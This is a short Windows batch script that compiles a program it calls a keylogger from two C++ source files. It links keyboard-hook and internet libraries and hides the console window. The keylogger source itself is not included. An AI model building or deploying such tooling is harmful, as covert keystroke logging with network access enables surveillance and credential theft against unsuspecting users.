@echo off
echo [*] Compiling keylogger...
g++ main.cpp hook.cpp -o logger.exe -luser32 -lwininet -mwindows
if %errorlevel% neq 0 (
    echo [x] Build failed!
) else (
    echo [✓] Build successful
)